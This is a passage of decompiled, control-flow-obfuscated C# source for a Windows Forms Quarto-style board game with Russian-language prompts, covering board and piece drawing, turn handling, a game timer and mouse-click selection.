using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 1828981949;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x2DF857ECu) % 6u)
					{
					case 5u:
						num = (int)((num2 * 523597880) ^ 0x6C73D182);
						continue;
					case 3u:
						Point = copy.Point;
						num = (int)(num2 * 896826032) ^ -1921530085;
						continue;
					case 2u:
						Big = copy.Big;
						Square = copy.Square;
						num = (int)(num2 * 1866073398) ^ -483750155;
						continue;
					case 0u:
						Dark = copy.Dark;
						num = (int)(num2 * 522921584) ^ -674338400;
						continue;
					default:
						return;
					case 4u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -1459042778;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDA6D9F58u) % 3u)
				{
				case 2u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -1707514094) ^ 0x6F022C80;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		while (true)
		{
			int num = 1872070839;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x715C8EEu) % 8u)
				{
				case 7u:
					Form1.smethod_14(menu);
					num = (int)((num2 * 1134224444) ^ 0x2BE742C0);
					continue;
				case 6u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 1114925813;
					continue;
				}
				case 5u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) < 296)
					{
						num = 1015312384;
						num3 = 1015312384;
					}
					else
					{
						num = 1049966633;
						num3 = 1049966633;
					}
					continue;
				}
				case 4u:
					num = (int)(num2 * 591313964) ^ -1550744157;
					continue;
				case 3u:
					num = (int)((num2 * 1878817432) ^ 0xE7DD0DB);
					continue;
				case 1u:
					num = ((int)num2 * -1938109210) ^ 0x7E54C10C;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -1994939200;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE5777520u) % 19u)
				{
				case 18u:
					num4++;
					num = ((int)num2 * -2078376491) ^ 0x1B63AEF7;
					continue;
				case 17u:
					num = ((int)num2 * -69643305) ^ 0x49CF5477;
					continue;
				case 16u:
					storage = new Figurine[4, 4];
					num3 = 0;
					num = (int)((num2 * 1347793162) ^ 0x5B07CCC4);
					continue;
				case 15u:
					num = ((int)num2 * -941562152) ^ -1331860433;
					continue;
				case 14u:
				{
					int num7;
					if (num4 >= 4)
					{
						num = -1485337719;
						num7 = -1485337719;
					}
					else
					{
						num = -1888311845;
						num7 = -1888311845;
					}
					continue;
				}
				case 13u:
					num = ((int)num2 * -520586623) ^ 0x1C4B2843;
					continue;
				case 12u:
					Paint_Board();
					num = (int)((num2 * 2117458041) ^ 0x46E6EBC);
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1322546993) ^ -1187261930;
					continue;
				case 10u:
					num3++;
					num = (int)(num2 * 873575661) ^ -142484718;
					continue;
				case 9u:
					num = ((int)num2 * -2023255099) ^ -1659071171;
					continue;
				case 8u:
					num4 = 0;
					num = -386828289;
					continue;
				case 6u:
					flag = num3 < 4;
					num = -636507715;
					continue;
				case 5u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -1213461916;
						num6 = -1213461916;
					}
					else
					{
						num5 = -468976421;
						num6 = -468976421;
					}
					num = num5 ^ ((int)num2 * -2015886448);
					continue;
				}
				case 4u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -70380878) ^ 0x29538F90;
					continue;
				case 3u:
					Paint_Storage();
					num = (int)(num2 * 2071080266) ^ -1064490289;
					continue;
				case 2u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = -258056400;
					continue;
				case 1u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = ((int)num2 * -292933465) ^ 0x70A8EC81;
					continue;
				default:
					return;
				case 7u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num3 = default(float);
		int num4 = default(int);
		int num5 = default(int);
		float num6 = default(float);
		bool dark = default(bool);
		float num9 = default(float);
		bool flag2 = default(bool);
		bool big = default(bool);
		float num10 = default(float);
		float num21 = default(float);
		bool square = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 449623690;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x611D3C12u) % 43u)
				{
				case 42u:
					num = 2016181189;
					continue;
				case 41u:
					num = ((int)num2 * -1995841233) ^ 0x5424817A;
					continue;
				case 40u:
					Form1.smethod_28(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = (int)(num2 * 907882234) ^ -1185629594;
					continue;
				case 39u:
				{
					int num13;
					int num14;
					if (!dark)
					{
						num13 = -890738581;
						num14 = -890738581;
					}
					else
					{
						num13 = -1371614219;
						num14 = -1371614219;
					}
					num = num13 ^ (int)(num2 * 286712135);
					continue;
				}
				case 38u:
					dark = board[num5, num4].Dark;
					num = (int)((num2 * 1031952656) ^ 0x355F6F53);
					continue;
				case 37u:
					brush_ = Form1.smethod_26();
					num = 693647211;
					continue;
				case 36u:
					num3 = (float)size * (num9 / 2f);
					num = ((int)num2 * -1928109837) ^ 0x4832F72B;
					continue;
				case 35u:
				{
					int num19;
					int num20;
					if (flag2)
					{
						num19 = 100287507;
						num20 = 100287507;
					}
					else
					{
						num19 = 1068551819;
						num20 = 1068551819;
					}
					num = num19 ^ (int)(num2 * 1940665440);
					continue;
				}
				case 34u:
				{
					int num15;
					int num16;
					if (!big)
					{
						num15 = -719278948;
						num16 = -719278948;
					}
					else
					{
						num15 = -27061646;
						num16 = -27061646;
					}
					num = num15 ^ (int)(num2 * 2006563251);
					continue;
				}
				case 33u:
					num3 = (float)size * (num9 / 2f);
					num6 = num10 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1878944291) ^ 0x3F9D16F1);
					continue;
				case 32u:
					Form1.smethod_24(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = 1625808480;
					continue;
				case 31u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1779828812) ^ -1361760638;
					continue;
				case 30u:
				{
					int num22;
					int num23;
					if (board[num5, num4].Point)
					{
						num22 = -45248382;
						num23 = -45248382;
					}
					else
					{
						num22 = -1638894722;
						num23 = -1638894722;
					}
					num = num22 ^ (int)(num2 * 530614108);
					continue;
				}
				case 29u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)(num2 * 468821190) ^ -1755565635;
					continue;
				case 28u:
					num = 114795228;
					continue;
				case 27u:
					num6 = num10 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 832708817) ^ -1705221497;
					continue;
				case 26u:
					num4++;
					num = 189781787;
					continue;
				case 25u:
					flag2 = num5 < 4;
					num = 2010159697;
					continue;
				case 24u:
					num4 = 0;
					num = 1637867355;
					continue;
				case 23u:
					num5++;
					num = ((int)num2 * -1522834559) ^ 0x211BEE30;
					continue;
				case 22u:
					num5 = 0;
					num = ((int)num2 * -1848114121) ^ -1709565377;
					continue;
				case 21u:
					num = ((int)num2 * -18764739) ^ -1851417368;
					continue;
				case 20u:
					num9 = 1f - num21 * 0.9f / (float)Form1.smethod_27(2.0);
					num10 = (float)size * num21;
					num = 1653227393;
					continue;
				case 19u:
					num21 = 1f;
					num = (int)((num2 * 706399823) ^ 0x6E6169A3);
					continue;
				case 18u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1209937830) ^ -433764779;
					continue;
				case 17u:
					num9 = 1f - num21 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 215676434;
					continue;
				case 16u:
					square = board[num5, num4].Square;
					num = (int)((num2 * 129765586) ^ 0x7BB1EC98);
					continue;
				case 15u:
					num21 = 0.7f;
					num = 694643283;
					continue;
				case 14u:
					big = board[num5, num4].Big;
					num = 1505226663;
					continue;
				case 13u:
				{
					int num17;
					int num18;
					if (square)
					{
						num17 = -2137443720;
						num18 = -2137443720;
					}
					else
					{
						num17 = -467241203;
						num18 = -467241203;
					}
					num = num17 ^ (int)(num2 * 1490902922);
					continue;
				}
				case 12u:
				{
					int num11;
					int num12;
					if (!flag)
					{
						num11 = 255425867;
						num12 = 255425867;
					}
					else
					{
						num11 = 734937549;
						num12 = 734937549;
					}
					num = num11 ^ ((int)num2 * -165948991);
					continue;
				}
				case 11u:
					num = (int)((num2 * 1250774961) ^ 0x71BD210);
					continue;
				case 10u:
					num = (int)((num2 * 1447203108) ^ 0x58B9985F);
					continue;
				case 9u:
					num = (int)((num2 * 929433059) ^ 0x77B10EED);
					continue;
				case 8u:
					flag = num4 < 4;
					num = 14333866;
					continue;
				case 7u:
					num = (int)((num2 * 1089509024) ^ 0x17910C53);
					continue;
				case 6u:
					num = ((int)num2 * -1059218854) ^ 0x7FDA95EB;
					continue;
				case 5u:
				{
					int num7;
					int num8;
					if (board[num5, num4] == null)
					{
						num7 = -948447841;
						num8 = -948447841;
					}
					else
					{
						num7 = -993075395;
						num8 = -993075395;
					}
					num = num7 ^ ((int)num2 * -434896793);
					continue;
				}
				case 3u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -241586360) ^ -265946764;
					continue;
				case 2u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -504754229) ^ -144466194;
					continue;
				case 1u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -2069226322) ^ 0x1D98250D;
					continue;
				default:
					return;
				case 0u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num8 = default(float);
		float num10 = default(float);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		bool point = default(bool);
		bool dark = default(bool);
		float num7 = default(float);
		float num6 = default(float);
		bool flag2 = default(bool);
		int num3 = default(int);
		float num9 = default(float);
		bool flag = default(bool);
		int num11 = default(int);
		while (true)
		{
			int num = -244637575;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x90901EF8u) % 37u)
				{
				case 36u:
					Form1.smethod_28(graphics_, brush_, num8, num8, num10, num10);
					num = (int)((num2 * 1197254721) ^ 0x5F88B1E8);
					continue;
				case 34u:
				{
					int num17;
					int num18;
					if (flag3)
					{
						num17 = 665730564;
						num18 = 665730564;
					}
					else
					{
						num17 = 1721840588;
						num18 = 1721840588;
					}
					num = num17 ^ ((int)num2 * -1174260749);
					continue;
				}
				case 33u:
				{
					int num21;
					int num22;
					if (flag4)
					{
						num21 = -1390930611;
						num22 = -1390930611;
					}
					else
					{
						num21 = -364911503;
						num22 = -364911503;
					}
					num = num21 ^ ((int)num2 * -1418044196);
					continue;
				}
				case 32u:
				{
					int num19;
					int num20;
					if (point)
					{
						num19 = -2110155076;
						num20 = -2110155076;
					}
					else
					{
						num19 = -412927606;
						num20 = -412927606;
					}
					num = num19 ^ (int)(num2 * 1263862891);
					continue;
				}
				case 31u:
				{
					int num13;
					int num14;
					if (!dark)
					{
						num13 = 508568448;
						num14 = 508568448;
					}
					else
					{
						num13 = 794151044;
						num14 = 794151044;
					}
					num = num13 ^ ((int)num2 * -1095018817);
					continue;
				}
				case 30u:
					num7 = 1f - num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -729460088;
					continue;
				case 29u:
					flag2 = num3 < 4;
					num = -1293175592;
					continue;
				case 28u:
					num8 = (float)size * (num7 / 2f) - 4f;
					num10 = num9 * 0.9f / (float)Form1.smethod_27(2.0);
					flag = num3 < 2;
					num = ((int)num2 * -1019825490) ^ 0x2310F9ED;
					continue;
				case 27u:
					num11 = 0;
					num = (int)(num2 * 1478677539) ^ -2085280694;
					continue;
				case 26u:
					num = ((int)num2 * -1085967534) ^ 0x2B993354;
					continue;
				case 25u:
					num10 = num9 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num11, num3].Point;
					num = ((int)num2 * -321793199) ^ -799538259;
					continue;
				case 23u:
					Form1.smethod_20(pictureBox[num11, num3], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num11, num3]), Form1.smethod_16((Control)(object)pictureBox[num11, num3])));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num11, num3]));
					dark = storage[num11, num3].Dark;
					num = ((int)num2 * -995631239) ^ -1539613193;
					continue;
				case 22u:
					Form1.smethod_30((Control)(object)pictureBox[num11, num3]);
					num = -725521364;
					continue;
				case 21u:
					num = ((int)num2 * -1217472830) ^ 0x7BC96536;
					continue;
				case 20u:
					num6 = 0.7f;
					num = -606445505;
					continue;
				case 19u:
					num = (int)(num2 * 301345641) ^ -957818583;
					continue;
				case 18u:
					num = (int)(num2 * 161623803) ^ -707982769;
					continue;
				case 17u:
					num11++;
					num = (int)((num2 * 739972582) ^ 0x778BBE8F);
					continue;
				case 16u:
					num7 = 1f - num6 * 0.9f / (float)Form1.smethod_27(2.0);
					num9 = (float)size * num6;
					num = -201881245;
					continue;
				case 15u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8, num8, num10, num10);
					num = (int)(num2 * 1502941478) ^ -1040581797;
					continue;
				case 14u:
					num3 = 0;
					num = -589749552;
					continue;
				case 13u:
					num8 = (float)size * (num7 / 2f) - 4f;
					num = ((int)num2 * -760022006) ^ 0x4240C561;
					continue;
				case 12u:
					num = (int)((num2 * 456336284) ^ 0x6CDDDCBE);
					continue;
				case 11u:
					num = ((int)num2 * -486256044) ^ -1146767986;
					continue;
				case 10u:
					flag4 = num11 < 4;
					num = -1434219950;
					continue;
				case 9u:
					Form1.smethod_24(graphics_, brush_, num8, num8, num10, num10);
					num = -2093589358;
					continue;
				case 8u:
					num6 = 1f;
					num = (int)(num2 * 267570982) ^ -1077128365;
					continue;
				case 7u:
				{
					int num15;
					int num16;
					if (!flag2)
					{
						num15 = 473704985;
						num16 = 473704985;
					}
					else
					{
						num15 = 1384449303;
						num16 = 1384449303;
					}
					num = num15 ^ (int)(num2 * 317512285);
					continue;
				}
				case 6u:
				{
					int num12;
					if (!storage[num11, num3].Big)
					{
						num = -2047767892;
						num12 = -2047767892;
					}
					else
					{
						num = -45802550;
						num12 = -45802550;
					}
					continue;
				}
				case 5u:
					brush_ = Form1.smethod_26();
					num = -562650135;
					continue;
				case 4u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -685096504) ^ 0x722BE171;
					continue;
				case 3u:
					flag3 = storage[num11, num3] != null;
					num = -1422958332;
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 39051101;
						num5 = 39051101;
					}
					else
					{
						num4 = 665180251;
						num5 = 665180251;
					}
					num = num4 ^ (int)(num2 * 524901121);
					continue;
				}
				case 1u:
					num = (int)((num2 * 1391734140) ^ 0x68EE4076);
					continue;
				case 0u:
					num3++;
					num = -881017535;
					continue;
				default:
					return;
				case 24u:
					break;
				case 35u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		int num8 = default(int);
		int num9 = default(int);
		int num5 = default(int);
		int num7 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -2004406397;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBCF973C9u) % 31u)
				{
				case 30u:
					step = 1;
					num = (int)(num2 * 1541997994) ^ -413412788;
					continue;
				case 29u:
					step = 0;
					num = (int)(num2 * 878171758) ^ -2004463197;
					continue;
				case 28u:
					num8 = Form1.smethod_33(rnd, 4);
					num9 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 1863947097) ^ 0x6003C1EB);
					continue;
				case 27u:
					num5 = 0;
					num = -1044423738;
					continue;
				case 26u:
				{
					int num6;
					if (num5 < 4)
					{
						num = -1790026599;
						num6 = -1790026599;
					}
					else
					{
						num = -132941706;
						num6 = -132941706;
					}
					continue;
				}
				case 25u:
					num = ((int)num2 * -1380092341) ^ 0x314FE31A;
					continue;
				case 24u:
					num5++;
					num = (int)((num2 * 1088592240) ^ 0x56B85E96);
					continue;
				case 23u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -459260439) ^ 0x18F47FC4;
					continue;
				case 22u:
				{
					int num10;
					int num11;
					if (!turn)
					{
						num10 = -958170484;
						num11 = -958170484;
					}
					else
					{
						num10 = -806843726;
						num11 = -806843726;
					}
					num = num10 ^ ((int)num2 * -2007623539);
					continue;
				}
				case 21u:
					Form1.smethod_7((Control)(object)pictureBox[num7, num5], bool_0: true);
					num = -1474164422;
					continue;
				case 20u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.Blue);
					num = (int)(num2 * 927912898) ^ -1960006594;
					continue;
				case 19u:
					num = (int)((num2 * 1318278009) ^ 0xA0BD419);
					continue;
				case 18u:
					num7 = 0;
					num = (int)((num2 * 123415382) ^ 0x464513FA);
					continue;
				case 17u:
					num = (int)((num2 * 1415389689) ^ 0x45349140);
					continue;
				case 16u:
					num = -1047491211;
					continue;
				case 15u:
					num = ((int)num2 * -363233540) ^ -1669675396;
					continue;
				case 14u:
					num = (int)((num2 * 1098685978) ^ 0x4EDCD55B);
					continue;
				case 13u:
					num = ((int)num2 * -232892951) ^ -64183539;
					continue;
				case 12u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = (int)(num2 * 984167348) ^ -1730683732;
					continue;
				case 11u:
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 96784109) ^ 0x577CA379);
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1628064314) ^ -1521449848;
					continue;
				case 7u:
					num = (int)((num2 * 1511580984) ^ 0x3600F1C0);
					continue;
				case 6u:
					num7++;
					num = (int)((num2 * 469908183) ^ 0x363FD7E9);
					continue;
				case 5u:
					flag = num7 < 4;
					num = -1206294651;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1537991374;
						num4 = -1537991374;
					}
					else
					{
						num3 = -1603884056;
						num4 = -1603884056;
					}
					num = num3 ^ ((int)num2 * -1275414666);
					continue;
				}
				case 3u:
					num = ((int)num2 * -983354670) ^ -858731884;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1960282052;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -883228494) ^ 0x791D6B57;
					continue;
				case 0u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 10795214) ^ -1586076781;
					continue;
				default:
					return;
				case 10u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -901050244;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA66C2A6Fu) % 4u)
				{
				case 3u:
					time = time.AddSeconds(1.0);
					num = ((int)num2 * -1569151909) ^ 0x863C5B4;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = ((int)num2 * -1059898892) ^ -1748851986;
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Expected O, but got Unknown
		int num9 = default(int);
		int num3 = default(int);
		int num7 = default(int);
		int num6 = default(int);
		bool flag = default(bool);
		Point point = default(Point);
		while (true)
		{
			int num = 1957259628;
			while (true)
			{
				uint num2;
				int num12;
				switch ((num2 = (uint)num ^ 0x68527DA9u) % 24u)
				{
				case 23u:
					num = (int)((num2 * 367640421) ^ 0x69AE2777);
					continue;
				case 22u:
					num = (int)(num2 * 1495059064) ^ -2102219182;
					continue;
				case 21u:
					num = ((int)num2 * -953326728) ^ 0x7EB3A050;
					continue;
				case 20u:
					if (storage[num9, num3] != null)
					{
						num = 338866819;
						continue;
					}
					goto IL_0067;
				case 19u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 502139193) ^ 0x6DF9B6AC);
					continue;
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num7, num6], Color.White);
					num = 1972877159;
					continue;
				case 16u:
					num6 = 0;
					num = 256730928;
					continue;
				case 15u:
					flag = num7 < 4;
					num = 1658987688;
					continue;
				case 13u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1976653616) ^ 0x54236A9D;
					continue;
				case 12u:
					num = (int)(num2 * 334071942) ^ -1042331772;
					continue;
				case 11u:
					num3 -= 4;
					num = (int)(num2 * 896872531) ^ -489846876;
					continue;
				case 10u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num9, num3]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = 593287894;
						num12 = 593287894;
						continue;
					}
					goto IL_0067;
				case 9u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = 1118237825;
						num11 = 1118237825;
					}
					else
					{
						num10 = 349006561;
						num11 = 349006561;
					}
					num = num10 ^ (int)(num2 * 1640713360);
					continue;
				}
				case 8u:
					Form1.smethod_5((Control)(object)borderBox[num9, num3], Color.Red);
					num = (int)(num2 * 1378353490) ^ -1819287413;
					continue;
				case 7u:
					num7++;
					num = ((int)num2 * -1659744889) ^ 0x29A13A4F;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -801912288) ^ -2108886363;
					continue;
				case 5u:
					num7 = 0;
					num = (int)((num2 * 1154519142) ^ 0x7A01C3C8);
					continue;
				case 4u:
					num9 = point.Y / size;
					num = (int)(num2 * 633633392) ^ -410904367;
					continue;
				case 3u:
					num6++;
					num = ((int)num2 * -939938965) ^ -8729207;
					continue;
				case 2u:
					num = (int)((num2 * 2113159234) ^ 0x1391CB4E);
					continue;
				case 1u:
				{
					int num8;
					if (num6 < 4)
					{
						num = 169293083;
						num8 = 169293083;
					}
					else
					{
						num = 392035286;
						num8 = 392035286;
					}
					continue;
				}
				case 0u:
				{
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num3 = point.X / size;
					int num4;
					int num5;
					if (num3 > 1)
					{
						num4 = -803393582;
						num5 = -803393582;
					}
					else
					{
						num4 = -1443401051;
						num5 = -1443401051;
					}
					num = num4 ^ (int)(num2 * 1437655885);
					continue;
				}
				default:
					return;
				case 14u:
					break;
				case 17u:
					return;
					IL_0067:
					num = 1486748168;
					num12 = 1486748168;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_029a: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b0: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num2 = Form1.smethod_39(e) / size;
		int num11 = default(int);
		bool flag4 = default(bool);
		bool flag2 = default(bool);
		int num8 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num3 = -657237194;
			while (true)
			{
				uint num4;
				int num7;
				switch ((num4 = (uint)num3 ^ 0xA73F9382u) % 30u)
				{
				case 29u:
					num11 = 0;
					num3 = ((int)num4 * -2084819666) ^ 0x3BF2A835;
					continue;
				case 28u:
				{
					int num14;
					int num15;
					if (!flag4)
					{
						num14 = 1033871283;
						num15 = 1033871283;
					}
					else
					{
						num14 = 1795257752;
						num15 = 1795257752;
					}
					num3 = num14 ^ (int)(num4 * 1357385959);
					continue;
				}
				case 27u:
					flag2 = num11 < 4;
					num3 = -287315298;
					continue;
				case 26u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 1789688792;
						num10 = 1789688792;
					}
					else
					{
						num9 = 225751256;
						num10 = 225751256;
					}
					num3 = num9 ^ (int)(num4 * 1817596115);
					continue;
				}
				case 25u:
					num8++;
					num3 = -114734649;
					continue;
				case 24u:
					num3 = ((int)num4 * -43773431) ^ -1316653939;
					continue;
				case 23u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num2 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num3 = (int)(num4 * 279615398) ^ -1528965835;
					continue;
				case 22u:
					num3 = (int)(num4 * 1163342883) ^ -1020005456;
					continue;
				case 21u:
					num3 = (int)((num4 * 267094743) ^ 0x1AF5CBA6);
					continue;
				case 19u:
					num3 = ((int)num4 * -1522063202) ^ -921824650;
					continue;
				case 18u:
					num8 = 0;
					num3 = -1702537184;
					continue;
				case 17u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = -1195035493;
						num13 = -1195035493;
					}
					else
					{
						num12 = -376914244;
						num13 = -376914244;
					}
					num3 = num12 ^ ((int)num4 * -512101403);
					continue;
				}
				case 16u:
					Paint_Board();
					num3 = (int)((num4 * 951547975) ^ 0x4D9A8973);
					continue;
				case 15u:
					num11++;
					num3 = (int)((num4 * 633143441) ^ 0x46AB0E16);
					continue;
				case 14u:
					flag4 = Form1.smethod_41((Control)(object)borderBox[num11, num8]) == Color.Blue;
					num3 = -184559452;
					continue;
				case 13u:
					flag = num8 < 4;
					num3 = -450772054;
					continue;
				case 12u:
					num3 = (int)((num4 * 380493379) ^ 0x55DA8EA1);
					continue;
				case 11u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num11, num8]), num * size + 4, num2 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
